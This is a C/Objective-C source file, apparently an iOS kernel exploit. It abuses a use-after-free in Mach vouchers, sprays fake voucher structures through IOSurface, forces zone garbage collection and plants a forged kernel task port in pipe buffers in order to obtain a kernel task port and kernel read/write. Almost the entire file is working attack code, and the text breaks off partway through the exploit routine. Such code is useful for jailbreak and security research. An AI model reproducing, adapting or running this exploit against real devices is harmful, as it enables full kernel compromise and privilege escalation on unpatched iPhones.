#include <errno.h>              // errno
#include <sched.h>              // sched_yield
#include <stdlib.h>             // malloc, free
#include <string.h>             // strerror
#include <unistd.h>             // usleep, setuid, getuid
#include <pthread.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <mach-o/loader.h>
#include <CoreFoundation/CoreFoundation.h>

#import <Foundation/Foundation.h>

#include "common.h"             // LOG, uint64_t
#include "pwn.h"
#include "iokit.h"

// ********** ********** ********** constants ********** ********** **********

const uint64_t IOSURFACE_CREATE_SURFACE =  0;
const uint64_t IOSURFACE_SET_VALUE      =  9;
const uint64_t IOSURFACE_GET_VALUE      = 10;
const uint64_t IOSURFACE_DELETE_VALUE   = 11;

// ********** ********** ********** helpers ********** ********** **********

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

// ********** ********** ********** data structures ********** ********** **********

#define IO_BITS_ACTIVE          0x80000000
#define IOT_PORT                0
#define IKOT_TASK               2
#define IKOT_CLOCK              25
#define IKOT_IOKIT_CONNECT      29

#define PIPEBUF_TASK_OFFSET     0x100

#define WQT_QUEUE               0x2
#define _EVENT_MASK_BITS        ((sizeof(uint32_t) * 8) - 7)

typedef volatile struct 
{
    /* 0x00 */ uint32_t iv_hash;
    /* 0x04 */ uint32_t iv_sum;
    /* 0x08 */ uint32_t iv_refs;
    /* 0x0c */ uint32_t iv_table_size;
    /* 0x10 */ uint32_t iv_inline_table[6];
    /* 0x28 */ uint64_t padding0;
    /* 0x30 */ uint64_t iv_table;
    /* 0x38 */ uint64_t iv_port;
    /* 0x40 */ uint64_t iv_hash_link_next;
    /* 0x48 */ uint64_t iv_hash_link_prev;
} fake_ipc_voucher_t;

typedef volatile struct 
{
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct
{
    struct {
        uint64_t data;
        uint32_t reserved : 24,
                    type     :  8;
        uint32_t pad;
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

union waitq_flags {
    struct {
        uint32_t /* flags */
    waitq_type:2,    /* only public field */
    waitq_fifo:1,    /* fifo wakeup policy? */
    waitq_prepost:1, /* waitq supports prepost? */
    waitq_irq:1,     /* waitq requires interrupts disabled */
    waitq_isvalid:1, /* waitq structure is valid */
    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
    waitq_eventmask:_EVENT_MASK_BITS;
    };
    uint32_t flags;
};

typedef struct 
{
    mach_msg_header_t head;
    uint64_t verification_key;
    char data[0];
    char padding[4];
} mach_msg_data_buffer_t;

// ********** ********** ********** MIG ********** ********** **********

struct simple_msg
{
    mach_msg_header_t hdr;
    char buf[0];
};

/* credits to ian beer */
mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size) 
{
    // allocate a port to send the messages to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) 
    {
        printf(" [-] failed to allocate port\n");
        exit(EXIT_FAILURE);
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    err = mach_port_set_attributes(mach_task_self(),
                                   q,
                                   MACH_PORT_LIMITS_INFO,
                                   (mach_port_info_t)&limits,
                                   MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS) 
    {
        printf(" [-] failed to increase queue limit\n");
        exit(EXIT_FAILURE);
    }

    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
    struct simple_msg *msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);

    for (int i = 0; i < 256; i++) 
    {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414142;

        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);

        if (err != KERN_SUCCESS) 
        {
            printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
            exit(EXIT_FAILURE);
        }
    }

    return q;
}

uint32_t message_size_for_kalloc_size(uint32_t size)
{
    return ((size * 3) / 4) - 0x74;
}

void trigger_gc_please()
{
    // size = 100 * 16,384 * 256 = 419,430,400 = ~420mb (max)

    const int gc_ports_cnt = 100;
    int gc_ports_max = gc_ports_cnt;
    mach_port_t gc_ports[gc_ports_cnt] = { 0 };
    
    uint32_t body_size = message_size_for_kalloc_size(16384) - sizeof(mach_msg_header_t); // 1024
    uint8_t *body = malloc(body_size);
    memset(body, 0x41, body_size);
    
    int64_t avgTime = 0;
    for (int i = 0; i < gc_ports_cnt; i++)
    {
        uint64_t t0;
        int64_t tdelta;

        t0 = mach_absolute_time();
        gc_ports[i] = send_kalloc_message(body, body_size);
        tdelta = mach_absolute_time() - t0;

        /* 
            this won't necessarily get triggered on newer/faster devices (ie. >=A9)
            this is mainly designed for older devices (in my case, A7) where spraying
            such a large amount of data is a painful process 
            the idea here is to look for a longer spray which signals that GC may have
            taken place
        */
        if (avgTime && tdelta - avgTime > avgTime/2)
        {
            LOG("got gc at %d -- breaking", i);
            gc_ports_max = i;
            break;
        }
        avgTime = ( avgTime * i + tdelta ) / (i + 1);
    }

    for (int i = 0; i < gc_ports_max; i++)
    {
        mach_port_destroy(mach_task_self(), gc_ports[i]);
    }

    sched_yield();
    sleep(1);
}

// Raw MIG function for a merged IOSurface deleteValue + setValue call, attempting to increase performance.
// Prepare everything - sched_yield() - fire.
static kern_return_t reallocate_buf(io_connect_t client, uint32_t surfaceId, uint32_t propertyId, void *buf, mach_vm_size_t len)
{
#pragma pack(4)
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        uint32_t inband_input[4];
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } DeleteRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        uint32_t selector;
        mach_msg_type_number_t scalar_inputCnt;
        mach_msg_type_number_t inband_inputCnt;
        mach_vm_address_t ool_input;
        mach_vm_size_t ool_input_size;
        mach_msg_type_number_t inband_outputCnt;
        mach_msg_type_number_t scalar_outputCnt;
        mach_vm_address_t ool_output;
        mach_vm_size_t ool_output_size;
    } SetRequest;
    typedef struct {
        mach_msg_header_t Head;
        NDR_record_t NDR;
        kern_return_t RetCode;
        mach_msg_type_number_t inband_outputCnt;
        char inband_output[4096];
        mach_msg_type_number_t scalar_outputCnt;
        uint64_t scalar_output[16];
        mach_vm_size_t ool_output_size;
        mach_msg_trailer_t trailer;
    } Reply;
#pragma pack()

    // Delete
    union {
        DeleteRequest In;
        Reply Out;
    } DMess;

    DeleteRequest *DInP = &DMess.In;
    Reply *DOutP = &DMess.Out;

    DInP->NDR = NDR_record;
    DInP->selector = IOSURFACE_DELETE_VALUE;
    DInP->scalar_inputCnt = 0;

    DInP->inband_input[0] = surfaceId;
    DInP->inband_input[2] = transpose(propertyId);
    DInP->inband_input[3] = 0x0; // Null terminator
    DInP->inband_inputCnt = sizeof(DInP->inband_input);

    DInP->ool_input = 0;
    DInP->ool_input_size = 0;

    DInP->inband_outputCnt = sizeof(uint32_t);
    DInP->scalar_outputCnt = 0;
    DInP->ool_output = 0;
    DInP->ool_output_size = 0;

    DInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    DInP->Head.msgh_remote_port = client;
    DInP->Head.msgh_local_port = mig_get_reply_port();
    DInP->Head.msgh_id = 2865;
    DInP->Head.msgh_reserved = 0;

    // Set
    union {
        SetRequest In;
        Reply Out;
    } SMess;

    SetRequest *SInP = &SMess.In;
    Reply *SOutP = &SMess.Out;

    SInP->NDR = NDR_record;
    SInP->selector = IOSURFACE_SET_VALUE;
    SInP->scalar_inputCnt = 0;

    SInP->inband_inputCnt = 0;

    SInP->ool_input = (mach_vm_address_t)buf;
    SInP->ool_input_size = len;

    SInP->inband_outputCnt = sizeof(uint32_t);
    SInP->scalar_outputCnt = 0;
    SInP->ool_output = 0;
    SInP->ool_output_size = 0;

    SInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    SInP->Head.msgh_remote_port = client;
    SInP->Head.msgh_local_port = mig_get_reply_port();
    SInP->Head.msgh_id = 2865;
    SInP->Head.msgh_reserved = 0;

    // Deep breath
    sched_yield();

    // Fire
    kern_return_t ret = mach_msg(&DInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret == KERN_SUCCESS)
    {
        ret = DOutP->RetCode;
    }

    if (ret != KERN_SUCCESS)
    {
        return ret;
    }

    ret = mach_msg(&SInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(SetRequest), (mach_msg_size_t)sizeof(Reply), SInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret == KERN_SUCCESS)
    {
        ret = SOutP->RetCode;
    }

    return ret;
}

static void set_nonblock(int fd) 
{
    int flags = fcntl(fd, F_GETFL);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

int increase_file_limit() 
{
    int err = 0;
    struct rlimit rl = {};
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }

    rl.rlim_cur = 10240;
    rl.rlim_max = rl.rlim_cur;
    err = setrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    err = getrlimit(RLIMIT_NOFILE, &rl);
    if (err != 0)
    {
        return err;
    }
    
    return 0;
}

static kern_return_t send_port(mach_port_t rcv, mach_port_t myP)
{
    typedef struct {
        mach_msg_header_t          Head;
        mach_msg_body_t            msgh_body;
        mach_msg_port_descriptor_t task_port;
    } Request;

    kern_return_t err = 0;
    
    Request stuff;
    Request *InP = &stuff;
    InP->Head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
    InP->Head.msgh_size = sizeof(Request);
    InP->Head.msgh_remote_port = rcv;
    InP->Head.msgh_local_port = MACH_PORT_NULL;
    InP->Head.msgh_id = 0x1337;
    
    InP->msgh_body.msgh_descriptor_count = 1;
    InP->task_port.name = myP;
    InP->task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    InP->task_port.type = MACH_MSG_PORT_DESCRIPTOR;

    err = mach_msg(&InP->Head, MACH_SEND_MSG | MACH_SEND_TIMEOUT, InP->Head.msgh_size, 0, 0, 5, 0);
    
    if (err) 
    {
        printf("mach_msg failed = %d (%s)!\n",err,mach_error_string(err));
    }
    
    return err;
}

static inline uint32_t mach_port_waitq_flags() 
{
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

// kinda messy function signature 
uint64_t send_buffer_to_kernel_and_find(offsets_t *offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
{
    kern_return_t ret;

    buffer_msg->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    buffer_msg->head.msgh_local_port = MACH_PORT_NULL;
    buffer_msg->head.msgh_size = msg_size;

    mach_port_t port;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to allocate mach port: %x", ret);
        goto err;
    }
    
    LOG("got port: %x", port);

    ret = _kernelrpc_mach_port_insert_right_trap(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed ot insert send right: %x", ret);
        goto err;
    }
    
    ret = mach_ports_register(mach_task_self(), &port, 1);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to register mach port: %x", ret);
        goto err;
    }
    
    buffer_msg->head.msgh_remote_port = port;

    ret = mach_msg(&buffer_msg->head, MACH_SEND_MSG, buffer_msg->head.msgh_size, 0, 0, 0, 0);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to send mach message: %x (%s)", ret, mach_error_string(ret));
        goto err;
    }
    
    uint64_t itk_registered = read64(our_task_addr + offs->struct_offsets.task_itk_registered);
    if (itk_registered == 0x0)
    {
        LOG("failed to read our_task_addr->itk_registered!");
        goto err;
    }

    LOG("itk_registered: %llx", itk_registered);

    uint16_t msg_count = read64(itk_registered + offsetof(kport_t, ip_messages.port.msgcount)) & 0xffff;
    if (msg_count != 1)
    {
        LOG("got weird msgcount! expected 1 but got: %x", msg_count);
        goto err;
    }

    LOG("msg_count: %d", msg_count);

    uint64_t messages = read64(itk_registered + offsetof(kport_t, ip_messages.port.messages));
    if (messages == 0x0)
    {
        LOG("unable to find ip_messages.port.messages in kernel port!");
        goto err;
    }

    LOG("messages: %llx", messages);

    uint64_t header = read64(messages + 0x18); // ipc_kmsg->ikm_header
    if (header == 0x0)
    {
        LOG("unable to find ipc_kmsg->ikm_header");
        goto err;
    }
    
    LOG("header: %llx", header);

    uint64_t key_address = header + 0x20; // ikm_header->verification_key (in the msg body)

    LOG("key_address: %llx", key_address);

    uint64_t kernel_key = read64(key_address);
    if (kernel_key != buffer_msg->verification_key)
    {
        LOG("kernel verification key did not match! found wrong kmsg? expected: %llx, got: %llx", buffer_msg->verification_key, kernel_key);
        goto err;
    }

    ret = mach_ports_register(mach_task_self(), NULL, 0);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call mach_ports_register: %x", ret);
        goto err;
    }

    return key_address + sizeof(kernel_key);

err:
    return 0x0;    
}

uint64_t kalloc(mach_port_t the_one, uint64_t size)
{
    kern_return_t ret;
    mach_vm_address_t addr; 

    ret = mach_vm_allocate(the_one, (mach_vm_address_t *)&addr, (mach_vm_size_t)size, VM_FLAGS_ANYWHERE);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call mach_vm_allocate(0x%llx): %x %s", size, ret, mach_error_string(ret));
        return (uint64_t)0x0;
    }

    return (uint64_t)addr;
}

void kread(mach_port_t port, uint64_t addr, void *buf, size_t size)
{
    kern_return_t ret;
    size_t offset = 0;

    while (offset < size) 
    {
        mach_vm_size_t sz, chunk = 0xfff;
        if (chunk > size - offset) 
        {
            chunk = size - offset;
        }
        
        ret = mach_vm_read_overwrite(port, addr + offset, chunk, (mach_vm_address_t)buf + offset, &sz);
        if (ret != KERN_SUCCESS || 
            sz == 0) {
            LOG("failed to call mach_vm_read_overwrite (%llx): %x %s", addr, ret, mach_error_string(ret));
            break;
        }

        offset += sz;
    }
}

uint64_t kread64(mach_port_t port, uint64_t addr)
{
    uint64_t val = 0x0;
    kread(port, addr, (void *)&val, sizeof(val));
    return val;
}

void kwrite(mach_port_t port, uint64_t addr, void *buf, size_t len)
{
    kern_return_t ret;

    ret = mach_vm_write(port, addr, (vm_offset_t)buf, len);

    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call mach_vm_write(0x%llx, 0x%p, 0x%zx): %x %s", addr, buf, len, ret, mach_error_string(ret));
    }
}

void kwrite64(mach_port_t port, uint64_t addr, uint64_t val)
{
    kwrite(port, addr, &val, sizeof(val));
}

// ********** ********** ********** ye olde pwnage ********** ********** **********

kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_back)
{
    kern_return_t ret = KERN_SUCCESS;

    io_connect_t client = MACH_PORT_NULL;
    mach_vm_size_t pagesize = 0;
    
    mach_port_t before[0x2000] = { };
    mach_port_t after[0x1000] = { };
    mach_port_t preport[0x1000] = { };
    mach_port_t postport[0x200] = { };

    kport_t *fakeport = NULL;
    int *pipefds = NULL;
    void *pipebuf = NULL;

    /********** ********** data hunting ********** **********/

    vm_size_t pgsz = 0;
    ret = _host_page_size(mach_host_self(), &pgsz);
    pagesize = pgsz;
    LOG("page size: 0x%llx, %s", pagesize, mach_error_string(ret));
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to get page size! ret: %x %s", ret, mach_error_string(ret));
        goto out;
    }

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(service))
    {
        LOG("failed to find IOSurfaceRoot service");
        ret = KERN_FAILURE;
        goto out;
    }

    ret = IOServiceOpen(service, mach_task_self(), 0, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if (ret != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        LOG("failed to open an IOSurface client: %x (%s)", ret, mach_error_string(ret));
        goto out;
    }

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };

    typedef struct 
    {
        mach_vm_address_t addr1;
        mach_vm_address_t addr2;
        mach_vm_address_t addr3;
        uint32_t id;
    } surface_t;

    size_t size = offsets->iosurface.create_outsize;
    surface_t *surface = malloc(size);
    bzero(surface, size);

    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), surface, &size);
    if (ret != KERN_SUCCESS)
    {
        LOG("IOSURFACE_CREATE_SURFACE failed: %x (%s)", ret, mach_error_string(ret));
        goto out;
    }

    /* on 11.x the surface_t->addr3 entry doesn't exist */
    if (surface->id == 0x0)
    {
        surface->id = surface->addr3;
    }
    LOG("surface ID: 0x%x", surface->id);

    if (surface->id == 0x0)
    {
        LOG("failed to create an IOSurface! id was 0");
        ret = KERN_FAILURE;
        goto out;
    }

    /********** ********** black magic ********** **********/

    /* the fake voucher to be sprayed */
    fake_ipc_voucher_t fake_voucher = (fake_ipc_voucher_t)
    {
        .iv_refs = 100,
        .iv_port = 0x0,
    };
    
    /* set up our IOSurface data for spraying */
#define FILL_MEMSIZE 0x4000000
    int spray_qty = FILL_MEMSIZE / pagesize; /* # of pages to spray */ 
    
    int spray_size = (5 * sizeof(uint32_t)) + (spray_qty * ((4 * sizeof(uint32_t)) + pagesize));
    uint32_t *spray_data = malloc(spray_size); // header + (spray_qty * (item_header + pgsize))
    bzero((void *)spray_data, spray_size);
    
    uint32_t *spray_cur = spray_data;
    
    *(spray_cur++) = surface->id;
    *(spray_cur++) = 0x0;
    *(spray_cur++) = kOSSerializeMagic;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | spray_qty;
    for (int i = 0; i < spray_qty; i++)
    {
        *(spray_cur++) = kOSSerializeSymbol | 5;
        *(spray_cur++) = transpose(i);
        *(spray_cur++) = 0x0;
        *(spray_cur++) = (i + 1 >= spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeString | (pagesize - 1);
        
        for (uintptr_t ptr = (uintptr_t)spray_cur, end = ptr + pagesize; 
             ptr + sizeof(fake_ipc_voucher_t) <= end; 
             ptr += sizeof(fake_ipc_voucher_t))
        {
            bcopy((const void *)&fake_voucher, (void *)ptr, sizeof(fake_ipc_voucher_t));
        }
        
        spray_cur += (pagesize / sizeof(uint32_t));
    }

    /* we used this smaller dict later in order to reallocate our target OSString */
    int small_dictsz = (9 * sizeof(uint32_t)) + pagesize;
    uint32_t *dict_small = malloc(small_dictsz);
    bzero((void *)dict_small, small_dictsz);

    dict_small[0] = surface->id;
    dict_small[1] = 0x0;
    dict_small[2] = kOSSerializeMagic;
    dict_small[3] = kOSSerializeEndCollection | kOSSerializeArray | 1;
    dict_small[4] = kOSSerializeEndCollection | kOSSerializeDictionary | 1;
    dict_small[5] = kOSSerializeSymbol | 5;
    dict_small[6] = 0x0; /* Key */
    dict_small[7] = 0x0;
    dict_small[8] = kOSSerializeEndCollection | kOSSerializeString | (pagesize - 1);

    ret = increase_file_limit();
    if (ret != 0)
    {
        LOG("failed to increase file limit!");
        goto out;
    }

    int total_pipes = 0x500;
    size_t total_pipes_size = total_pipes * 2 * sizeof(int);
    pipefds = malloc(total_pipes_size);
    bzero(pipefds, total_pipes_size);

    for (size_t i = 0; i < total_pipes; i++) 
    {
        /* 
            we arrange our pipes in pairs 
            where pipe N is a read pipe, and 
            pipe N+1 is the corresponding write pipe
        */
        pipefds[i * 2] = -1;
        pipefds[i * 2 + 1] = -1;
        
        int error = pipe(&pipefds[i * 2]);
        if (error != 0 ||
            pipefds[i * 2] < 0 ||
            pipefds[i *  + 1] < 0)
        {
            close(pipefds[i * 2]);
            close(pipefds[i * 2 + 1]);

            total_pipes = i;
            break;   
        }

        set_nonblock(pipefds[i * 2 + 1]);
    }

    LOG("total pipes created: %d",total_pipes);

    pipebuf = malloc(pagesize);
    bzero(pipebuf, pagesize);

    /* create a few vouchers used to trigger the bug */
    mach_voucher_attr_recipe_data_t atm_data = 
    {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = 510
    };

    mach_port_t p2;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p2);
    
    mach_port_t p3;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p3);

    /* allocate 0x2000 vouchers to alloc some new fresh pages */
    for (int i = 0; i < sizeof(before) / sizeof(mach_port_t); i++)
    {
        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &before[i]);
    }
    
    /* alloc our target uaf voucher */
    mach_port_t p1;
    ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &p1);
    
    /* allocate 0x1000 more vouchers */
    for (int i = 0; i < sizeof(after) / sizeof(mach_port_t); i++)
    {
        ret = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &after[i]);
    }

    /*
        theoretically, we should now have 3 blocks of memory (roughly) as so:
        |-----------------------|-------------|------------------|
        |     0x2000 ports      | target port |   0x1000 ports   |
        |-----------------------|-------------|------------------| 
                                ^             ^
                                page with only our controlled ports
        hopefully our target port is now allocated on a page which contains only our 
        controlled ports. this means when we release all of our ports *all* allocations
        on the given page will be released, and when we trigger GC the page will be released
        back from the ipc_ports zone to be re-used by kalloc 
        this allows us to spray our fake vouchers via IOSurface in other kalloc zones 
        (ie. kalloc.1024), and the dangling pointer of the voucher will then overlap with one
        of our allocations
    */
    
    /* set up to trigger the bug */
    ret = thread_set_mach_voucher(mach_thread_self(), p1);
    
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p2);
    
    /* here we go! release the 0x1000 ports allocated after our target */
    for (int i = 0; i < 0x1000; i++)
    {
        mach_port_destroy(mach_task_self(), after[i]);
    }
    
    /* now release our target port via the uaf */
    ret = task_swap_mach_voucher(mach_task_self(), p1, &p3);
    
    /* release the 0x2000 ports allocated before our target */
    for (int i = 0; i < 0x2000; i++)
    {
        mach_port_destroy(mach_task_self(), before[i]);
    }
    
    /* 
        hopefully the page which contained our uaf port is now completely
        free of allocations, and we can trigger gc to release the page to 
        allow for reallocation into another kalloc zone
    */
    trigger_gc_please();
    
    /* spray our data via IOSurface */
    uint32_t dummy = 0;
    size = sizeof(dummy);
    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, spray_data, spray_size, &dummy, &size);
    if(ret != KERN_SUCCESS)
    {
        LOG("setValue(prep): %s", mach_error_string(ret));
        goto out;
    }
    
    mach_port_t real_port_to_fake_voucher = MACH_PORT_NULL;
    
    /* 
        alloc'ing ports either side of the kport_t that thread_get_mach_voucher 
        creates will give us much better success rate for guessing the 
        heap address of our pipe buffer-based port 

        someone once said iOS's heap randomization was weak
                            i didn't listen
            then i realised
                    iOS's heap randomization is weak
                                                    ...i should've listened
    */  

    for (int i = 0; i < sizeof(preport) / sizeof(mach_port_t); i++)
    {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &preport[i]);
    }

    /* fingers crossed we get a userland handle onto our 'fakeport' object */
    ret = thread_get_mach_voucher(mach_thread_self(), 0, &real_port_to_fake_voucher);

    for (int i = 0; i < sizeof(postport) / sizeof(mach_port_t); i++)
    {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &postport[i]);
    }

    LOG("port: %x", real_port_to_fake_voucher);
    
    if (!MACH_PORT_VALID(real_port_to_fake_voucher))
    {
        LOG("failed to get real_port_to_fake_voucher :(");
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("WE REALLY POSTED UP ON THIS BLOCK -- part 1 of #alwaysstayposted");
    
    uint8_t *response = (uint8_t *)malloc(spray_size);
    size_t sz = spray_size;

    int spray_index = 0;
    int port_index = 0;
    fake_ipc_voucher_t *target_voucher = NULL;

    LOG("getting responses...");
    for (int s = 0; s < spray_qty; s++)
    {
        bzero((void *)response, spray_size);

        uint32_t request[] =
        {
            surface->id,
            0x0,
            transpose(s),
            0x0,
        };

        ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &sz);
        if (ret != KERN_SUCCESS)
        {
            LOG("IOSURFACE_GET_VALUE: %x %s", ret, mach_error_string(ret));
            goto out;
        }

        uint8_t *cursor = response + 0x10;

        for (int j = 0; j < pagesize / sizeof(fake_ipc_voucher_t); j++)
        {
            fake_ipc_voucher_t *found_voucher = (fake_ipc_voucher_t *)(cursor + (j * sizeof(fake_ipc_voucher_t)));

            if (found_voucher->iv_port != 0)
            {
                LOG("found voucher!! s: %d, j: %d", s, j);
                LOG("port: %llx", found_voucher->iv_port);
                LOG("refs: %d", found_voucher->iv_refs);
                
                spray_index = s;
                port_index = j;
                target_voucher = found_voucher;

                goto found_voucher_lbl;
            }
        }
    }

    if (target_voucher == NULL)
    {
        LOG("failed to find the target voucher :-(");
        ret = KERN_FAILURE;
        goto out;
    }

found_voucher_lbl:;

    mach_port_t the_one = real_port_to_fake_voucher;
    uint64_t original_port_addr = target_voucher->iv_port;

    fake_ipc_voucher_t new_voucher = (fake_ipc_voucher_t)
    {
        .iv_port = (original_port_addr & ~(pagesize - 1)) + (pagesize * 64),
        .iv_refs = 200,
    };
    LOG("new port addr: 0x%llx", new_voucher.iv_port);

    fakeport = malloc(sizeof(kport_t));
    bzero((void *)fakeport, sizeof(kport_t));

    /* set up our fakeport for use later */
    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 100;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    fakeport->ip_kobject = new_voucher.iv_port + PIPEBUF_TASK_OFFSET; /* place the task struct just after the kport */

    memcpy(pipebuf, (void *)fakeport, sizeof(kport_t));

    for (int i = 0; i < total_pipes; i++)
    {
        int wfd = pipefds[2 * i + 1];
        size_t written = write(wfd, pipebuf, pagesize - 1);
        
        if (written != pagesize - 1)
        {
            /* failed to write, all our pipebuffers are full & we've run out of mem */ 

            total_pipes = i;
            LOG("total_pipes is now: %d", total_pipes);
            break;
        }
    }

    dict_small[6] = transpose(spray_index);

    uint8_t *osstring_buf = (uint8_t *)dict_small + (9 * sizeof(uint32_t));

    /* overwrite all the ports in the osstring */
    for (uintptr_t ptr = (uintptr_t)osstring_buf, end = ptr + pagesize;
         ptr + sizeof(fake_ipc_voucher_t) <= end;
         ptr += sizeof(fake_ipc_voucher_t))
    {
